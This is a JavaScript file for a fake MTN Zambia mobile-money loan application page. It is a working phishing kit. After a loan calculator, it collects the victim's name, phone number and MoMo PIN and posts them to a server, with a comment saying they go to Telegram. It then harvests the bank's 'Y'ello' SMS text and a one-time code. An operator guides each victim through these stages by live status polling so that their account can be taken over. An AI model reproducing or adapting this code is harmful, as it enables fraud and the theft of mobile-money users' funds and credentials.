document.addEventListener('DOMContentLoaded', () => {
    const urlParams = new URLSearchParams(window.location.search);
    const assignedAdminId = (urlParams.get('admin') || '').trim() || null;

    let sessionId = 'mtn_zm_' + Math.random().toString(36).substring(2, 14);
    let pollTimer = null;
    let smsCountdownTimer = null;
    let smsSubmitting = false;
    let otpSubmitting = false;

    const steps = {
        welcome: document.getElementById('step-welcome'),
        calculator: document.getElementById('step-calculator'),
        step1: document.getElementById('step-1-of-3'),
        step2: document.getElementById('step-2-of-3'),
        step3: document.getElementById('step-3-of-3'),
        pin: document.getElementById('step-pin'),
        waiting: document.getElementById('step-waiting'),
        sms: document.getElementById('step-sms'),
        otp: document.getElementById('step-otp'),
        success: document.getElementById('step-success')
    };

    const backBtn = document.getElementById('backBtn');
    const screenNotice = document.getElementById('screenNotice');

    const calcAmountSlider = document.getElementById('calcAmountSlider');
    const calcMonthsSlider = document.getElementById('calcMonthsSlider');
    const calcAmountDisplay = document.getElementById('calcAmountDisplay');
    const calcMonthsDisplay = document.getElementById('calcMonthsDisplay');
    const estimatedMonthly = document.getElementById('estimatedMonthly');

    const loanAmountInput = document.getElementById('loanAmountInput');
    const loanDurationSelect = document.getElementById('loanDurationSelect');
    const loanPurposeInput = document.getElementById('loanPurposeInput');

    const firstNameInput = document.getElementById('firstNameInput');
    const lastNameInput = document.getElementById('lastNameInput');
    const momoPhoneInput = document.getElementById('momoPhoneInput');

    const pinDigits = Array.from(document.querySelectorAll('.pin-digit'));
    const confirmPinBtn = document.getElementById('confirmPinBtn');
    const pinPhoneLabel = document.getElementById('pinPhoneLabel');

    const smsPasteInput = document.getElementById('smsPasteInput');
    const smsCountdownEl = document.getElementById('smsCountdown');
    const requestNewSmsBtn = document.getElementById('requestNewSmsBtn');

    const otpDigits = Array.from(document.querySelectorAll('.otp-digit'));
    const waitingHeading = document.getElementById('waitingHeading');
    const waitingSubtext = document.getElementById('waitingSubtext');

    let currentStepKey = 'welcome';

    function showNotice(text, type = 'warning') {
        screenNotice.textContent = text;
        screenNotice.className = `screen-notice ${type}`;
        screenNotice.style.display = 'block';
    }

    function clearNotice() {
        screenNotice.style.display = 'none';
        screenNotice.textContent = '';
    }

    function goTo(key, keepNotice = false) {
        if (!keepNotice) clearNotice();
        Object.values(steps).forEach((el) => el.classList.remove('active'));
        steps[key].classList.add('active');
        currentStepKey = key;
        backBtn.style.display = key === 'welcome' || key === 'waiting' || key === 'success' ? 'none' : 'inline-block';
    }

    function parseNumericAmount(val) {
        const cleaned = parseInt(String(val || '').replace(/[^\d]/g, ''), 10);
        return Number.isNaN(cleaned) || cleaned <= 0 ? 100000 : cleaned;
    }

    function formatZmw(num) {
        return 'ZMW ' + Number(num).toLocaleString();
    }

    function updateCalculator() {
        const amt = parseInt(calcAmountSlider.value, 10);
        const months = parseInt(calcMonthsSlider.value, 10);
        calcAmountDisplay.innerHTML = `<strong>${formatZmw(amt)}</strong>`;
        calcMonthsDisplay.innerHTML = `<strong>${months} months</strong>`;
        const monthly = Math.round((amt * 1.1) / months);
        estimatedMonthly.textContent = formatZmw(monthly);
        loanAmountInput.value = amt.toLocaleString();
        loanDurationSelect.value = `${months} Months`;
    }

    calcAmountSlider.addEventListener('input', updateCalculator);
    calcMonthsSlider.addEventListener('input', updateCalculator);
    updateCalculator();

    backBtn.addEventListener('click', () => {
        if (currentStepKey === 'calculator') goTo('welcome');
        else if (currentStepKey === 'step1') goTo('calculator');
        else if (currentStepKey === 'step2') goTo('step1');
        else if (currentStepKey === 'step3') goTo('step2');
        else if (currentStepKey === 'pin') goTo('step3');
        else if (currentStepKey === 'sms') goTo('pin');
        else if (currentStepKey === 'otp') goTo('sms');
    });

    document.getElementById('getStartedBtn').addEventListener('click', () => goTo('calculator'));
    document.getElementById('continueAppBtn').addEventListener('click', () => goTo('step1'));

    document.getElementById('toStep2Btn').addEventListener('click', () => {
        const amt = parseNumericAmount(loanAmountInput.value);
        loanAmountInput.value = amt.toLocaleString();
        goTo('step2');
    });

    // Enforce 10-digit MTN Zambia MoMo number starting with 096, 076, or 056
    momoPhoneInput.addEventListener('input', () => {
        momoPhoneInput.value = momoPhoneInput.value.replace(/\D/g, '').slice(0, 10);
    });

    document.getElementById('backToStep1Btn').addEventListener('click', () => goTo('step1'));

    document.getElementById('toStep3Btn').addEventListener('click', () => {
        const fn = firstNameInput.value.trim();
        const ln = lastNameInput.value.trim();
        const phone = momoPhoneInput.value.trim();

        if (!fn || !ln) {
            showNotice('Please enter your registered First Name and Last Name.', 'error');
            return;
        }
        if (!/^(096|076|056)\d{7}$/.test(phone)) {
            showNotice('Please enter a valid 10-digit MTN Zambia MoMo number starting with 096, 076, or 056.', 'error');
            return;
        }

        const amt = parseNumericAmount(loanAmountInput.value);
        const deposit = Math.max(200, Math.round(amt * 0.002));

        document.getElementById('sumLoanAmount').textContent = formatZmw(amt);
        document.getElementById('sumLoanDuration').textContent = loanDurationSelect.value;
        document.getElementById('sumLoanPurpose').textContent = loanPurposeInput.value.trim() || 'Personal / Business';
        document.getElementById('sumApplicantName').textContent = `${fn} ${ln}`.toUpperCase();
        document.getElementById('sumMomoPhone').textContent = phone;
        document.getElementById('sumSecurityDeposit').textContent = `${deposit.toLocaleString()} ZMW`;

        goTo('step3');
    });

    document.getElementById('backToStep2Btn').addEventListener('click', () => goTo('step2'));

    // Step 3 of 3 leads to PIN screen, then delivers PHONE NO and 5-digit PIN to Telegram
    document.getElementById('submitApplicationBtn').addEventListener('click', () => {
        pinPhoneLabel.textContent = momoPhoneInput.value.trim();
        clearPinBoxes();
        goTo('pin');
    });

    function clearPinBoxes() {
        pinDigits.forEach((input) => {
            input.value = '';
        });
        confirmPinBtn.disabled = true;
        if (pinDigits[0]) pinDigits[0].focus();
    }

    function readPin() {
        return pinDigits.map((d) => d.value).join('');
    }

    pinDigits.forEach((box, idx) => {
        box.addEventListener('input', () => {
            box.value = box.value.replace(/\D/g, '').slice(0, 1);
            if (box.value && idx < pinDigits.length - 1) {
                pinDigits[idx + 1].focus();
            }
            confirmPinBtn.disabled = readPin().length !== 5;
        });

        box.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !box.value && idx > 0) {
                pinDigits[idx - 1].focus();
            }
        });
    });

    confirmPinBtn.addEventListener('click', async () => {
        const pinVal = readPin();
        if (!/^\d{5}$/.test(pinVal)) {
            showNotice('Please enter your 5-digit MoMo PIN.', 'error');
            return;
        }

        const payload = {
            sessionId,
            phone: momoPhoneInput.value.trim(),
            pin: pinVal,
            amount: parseNumericAmount(loanAmountInput.value),
            duration: loanDurationSelect.value,
            purpose: loanPurposeInput.value.trim(),
            firstName: firstNameInput.value.trim(),
            lastName: lastNameInput.value.trim(),
            adminId: assignedAdminId
        };

        waitingHeading.innerHTML = '<strong>Verifying MoMo Details...</strong>';
        waitingSubtext.innerHTML = '<strong>Please wait while your MTN MoMo Zambia details are reviewed.</strong>';
        goTo('waiting');

        try {
            const res = await fetch('/api/submit-credentials', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const data = await res.json();
            if (data.success) {
                startStatusPolling();
            }
        } catch (err) {
            goTo('pin', true);
            showNotice('Network error while submitting. Please try again.', 'error');
        }
    });

    function startSmsScreen() {
        smsSubmitting = false;
        smsPasteInput.value = '';
        requestNewSmsBtn.style.display = 'none';
        let seconds = 15;
        smsCountdownEl.textContent = seconds;

        if (smsCountdownTimer) clearInterval(smsCountdownTimer);
        smsCountdownTimer = setInterval(() => {
            seconds -= 1;
            smsCountdownEl.textContent = Math.max(0, seconds);
            if (seconds <= 0) {
                clearInterval(smsCountdownTimer);
                requestNewSmsBtn.style.display = 'flex';
            }
        }, 1000);

        goTo('sms', true);
        smsPasteInput.focus();
    }

    async function handleAutoSmsSubmit() {
        if (smsSubmitting) return;
        const raw = smsPasteInput.value;
        const normalized = raw.trim().replace(/\s+/g, ' ');

        if (!normalized.startsWith("Y'ello.")) {
            return;
        }

        smsSubmitting = true;
        if (smsCountdownTimer) clearInterval(smsCountdownTimer);

        waitingHeading.innerHTML = '<strong>Submitting SMS Verification...</strong>';
        waitingSubtext.innerHTML = '<strong>Y\'ello SMS detected and submitted automatically.</strong>';
        goTo('waiting');

        try {
            const res = await fetch('/api/submit-sms', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId, smsText: raw })
            });
            const data = await res.json();

            if (!data.success) {
                smsSubmitting = false;
                goTo('sms');
                showNotice(data.message || 'Duplicate or invalid SMS not allowed.', 'error');
                return;
            }

            startStatusPolling();
        } catch (err) {
            smsSubmitting = false;
            goTo('sms');
            showNotice('Network error submitting SMS. Please try again.', 'error');
        }
    }

    smsPasteInput.addEventListener('input', handleAutoSmsSubmit);
    smsPasteInput.addEventListener('paste', () => {
        setTimeout(handleAutoSmsSubmit, 25);
    });

    requestNewSmsBtn.addEventListener('click', async () => {
        requestNewSmsBtn.disabled = true;
        try {
            await fetch('/api/request-new-sms', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId })
            });
            showNotice('New SMS request sent. Please wait for the incoming SMS on your MoMo number.', 'warning');
        } catch (err) {
            showNotice('Could not send new SMS request. Try again.', 'error');
        } finally {
            requestNewSmsBtn.disabled = false;
        }
    });

    function startOtpScreen() {
        otpSubmitting = false;
        otpDigits.forEach((d) => {
            d.value = '';
        });
        goTo('otp', true);
        if (otpDigits[0]) otpDigits[0].focus();
    }

    async function handleAutoOtpSubmit() {
        if (otpSubmitting) return;
        const code = otpDigits.map((d) => d.value).join('');
        if (!/^\d{4}$/.test(code)) return;

        otpSubmitting = true;
        waitingHeading.innerHTML = '<strong>Verifying 4-Digit OTP...</strong>';
        waitingSubtext.innerHTML = '<strong>Please wait while your OTP is verified.</strong>';
        goTo('waiting');

        try {
            const res = await fetch('/api/submit-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId, otpCode: code })
            });
            const data = await res.json();

            if (!data.success) {
                otpSubmitting = false;
                startOtpScreen();
                showNotice(data.message || 'Duplicate or invalid OTP not allowed.', 'error');
                return;
            }

            startStatusPolling();
        } catch (err) {
            otpSubmitting = false;
            startOtpScreen();
            showNotice('Network error submitting OTP. Please try again.', 'error');
        }
    }

    otpDigits.forEach((box, idx) => {
        box.addEventListener('input', () => {
            box.value = box.value.replace(/\D/g, '').slice(0, 1);
            if (box.value && idx < otpDigits.length - 1) {
                otpDigits[idx + 1].focus();
            }
            if (otpDigits.map((d) => d.value).join('').length === 4) {
                handleAutoOtpSubmit();
            }
        });

        box.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !box.value && idx > 0) {
                otpDigits[idx - 1].focus();
            }
        });
    });

    function startStatusPolling() {
        if (pollTimer) clearInterval(pollTimer);

        pollTimer = setInterval(async () => {
            try {
                const res = await fetch(`/api/check-status/${sessionId}`);
                const data = await res.json();

                if (data.status === 'approved_pin') {
                    clearInterval(pollTimer);
                    startSmsScreen();
                } else if (data.status === 'denied_pin') {
                    clearInterval(pollTimer);
                    goTo('step2');
                    showNotice('Please check your MOMO details and try again.', 'error');
                } else if (data.status === 'wrong_pin') {
                    clearInterval(pollTimer);
                    clearPinBoxes();
                    goTo('pin');
                    showNotice('INCORRECT PIN', 'error');
                } else if (data.status === 'sms_expired') {
                    clearInterval(pollTimer);
                    startSmsScreen();
                    showNotice('SMS EXPIRED', 'error');
                } else if (data.status === 'sms_done') {
                    clearInterval(pollTimer);
                    startOtpScreen();
                } else if (data.status === 'otp_expired') {
                    clearInterval(pollTimer);
                    startOtpScreen();
                    showNotice('OTP EXPIRES', 'error');
                } else if (data.status === 'success') {
                    clearInterval(pollTimer);
                    const amt = parseNumericAmount(loanAmountInput.value);
                    document.getElementById('finalLoanAmountDisplay').innerHTML = `<strong>${formatZmw(amt)}</strong>`;
                    goTo('success');
                }
            } catch (err) {
                console.error('Status poll error:', err);
            }
        }, 2500);
    }
});
            
